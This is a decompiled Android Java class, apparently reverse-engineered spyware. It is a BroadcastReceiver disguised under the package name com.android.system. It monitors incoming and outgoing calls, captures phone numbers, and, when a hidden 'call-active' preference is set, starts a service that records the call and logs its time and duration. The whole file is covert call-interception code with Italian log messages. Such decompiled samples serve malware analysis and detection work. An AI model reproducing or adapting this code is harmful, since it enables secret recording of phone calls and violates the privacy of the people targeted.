package com.android.system;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.TelephonyManager;
import com.app.system.common.service.EventsAndReceiveService;
import java.util.Date;

public class InOutCallsReceiver
  extends BroadcastReceiver
{
  private static int a;
  private static Date b;
  private static boolean c;
  private static String d;
  
  private void a(Context paramContext, int paramInt, String paramString)
  {
    int i = a;
    if (i == paramInt) {
      return;
    }
    switch (paramInt)
    {
    default: 
      break;
    case 2: 
      if (i != 1)
      {
        c = false;
        b = new Date();
        c(paramContext, paramString, b);
      }
      else
      {
        c = true;
        b = new Date();
        b(paramContext, d, b);
      }
      break;
    case 1: 
      c = true;
      b = new Date();
      d = paramString;
      a(paramContext, paramString, b);
      break;
    case 0: 
      if (i == 1) {
        d(paramContext, d, b);
      } else if (c) {
        a(paramContext, d, b, new Date());
      } else {
        b(paramContext, d, b, new Date());
      }
      break;
    }
    a = paramInt;
  }
  
  private void a(Context paramContext, String paramString, Date paramDate)
  {
    paramContext = new StringBuilder();
    paramContext.append("RINGING WITH INCOMING CALL FROM ");
    paramContext.append(paramString);
    com.security.d.a.d("InOutCallsReceiver", paramContext.toString(), new Object[0]);
  }
  
  private void a(Context paramContext, String paramString, Date paramDate1, Date paramDate2)
  {
    c(paramContext, paramString, paramDate1, paramDate2);
  }
  
  private void b(Context paramContext, String paramString, Date paramDate)
  {
    e(paramContext, paramString, paramDate);
  }
  
  private void b(Context paramContext, String paramString, Date paramDate1, Date paramDate2)
  {
    c(paramContext, paramString, paramDate1, paramDate2);
  }
  
  private void c(Context paramContext, String paramString, Date paramDate)
  {
    e(paramContext, paramString, paramDate);
  }
  
  private void c(final Context paramContext, final String paramString, final Date paramDate1, Date paramDate2)
  {
    if (c) {
      com.security.d.a.c("InOutCallsReceiver", "FINISHED INCOMING CALL", new Object[0]);
    } else {
      com.security.d.a.c("InOutCallsReceiver", "FINISHED OUTGOING CALL", new Object[0]);
    }
    new Handler().postDelayed(new Runnable()
    {
      public void run()
      {
        if (paramContext.getSharedPreferences("pref", 0).getBoolean("call-active", false))
        {
          localIntent = new Intent(paramContext, RecordCallService.class);
          localIntent.putExtra("data", "0");
          localIntent.putExtra("call_time", paramDate1.getTime() / 1000L);
          localIntent.putExtra("call_number", paramString);
          localIntent.putExtra("call_app", "P");
          localIntent.putExtra("call_dur", (System.currentTimeMillis() - paramDate1.getTime()) / 1000L);
          paramContext.startService(localIntent);
        }
        Intent localIntent = new Intent(paramContext, EventsAndReceiveService.class);
        localIntent.putExtra("event_core_app", "event_call_log");
        com.b.a.a.a.a(paramContext, localIntent);
      }
    }, 1000L);
  }
  
  private void d(Context paramContext, String paramString, Date paramDate)
  {
    paramContext = new StringBuilder();
    paramContext.append("UNANSWERED CALL FROM ");
    paramContext.append(paramString);
    com.security.d.a.c("InOutCallsReceiver", paramContext.toString(), new Object[0]);
  }
  
  private void e(Context paramContext, String paramString, Date paramDate)
  {
    if (paramString != null)
    {
      paramDate = paramString;
      if (paramString.length() > 0) {}
    }
    else
    {
      paramDate = "12345";
    }
    if (c)
    {
      paramString = new StringBuilder();
      paramString.append("ANSWERED INCOMING CALL FROM ");
      paramString.append(paramDate);
      com.security.d.a.c("InOutCallsReceiver", paramString.toString(), new Object[0]);
    }
    else
    {
      paramString = new StringBuilder();
      paramString.append("STARTED OUTGING CALL TO ");
      paramString.append(paramDate);
      com.security.d.a.c("InOutCallsReceiver", paramString.toString(), new Object[0]);
    }
    if (paramContext.getSharedPreferences("pref", 0).getBoolean("call-active", false)) {
      if (RecordCallService.b())
      {
        com.security.d.a.a("InOutCallsReceiver", "****** E' già in corso un'altra registrazione ******", new Object[0]);
      }
      else
      {
        Intent localIntent = new Intent(paramContext, RecordCallService.class);
        localIntent.putExtra("data", "1");
        StringBuilder localStringBuilder = new StringBuilder();
        if (c) {
          paramString = "0_";
        } else {
          paramString = "1_";
        }
        localStringBuilder.append(paramString);
        localStringBuilder.append(paramDate);
        localIntent.putExtra("number", localStringBuilder.toString());
        localIntent.putExtra("call_app", "P");
        paramContext.startService(localIntent);
      }
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    try
    {
      if (paramIntent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL"))
      {
        d = paramIntent.getStringExtra("android.intent.extra.PHONE_NUMBER");
        paramContext.getSharedPreferences("pref", 0);
        if (d != null) {
          d.isEmpty();
        }
      }
      else if (paramIntent.getAction().equals("android.intent.action.PHONE_STATE"))
      {
        String str = paramIntent.getExtras().getString("state");
        paramIntent = paramIntent.getExtras().getString("incoming_number");
        int i;
        if (str.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
          i = 0;
        } else if (str.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
          i = 2;
        } else if (str.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
          i = 1;
        } else {
          i = 0;
        }
        a(paramContext, i, paramIntent);
      }
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("InOutCallsReceiver", paramContext.getMessage(), new Object[0]);
    }
  }
}


/* Location:              ~/com/android/system/InOutCallsReceiver.class
 *
 * Reversed by:           J
 */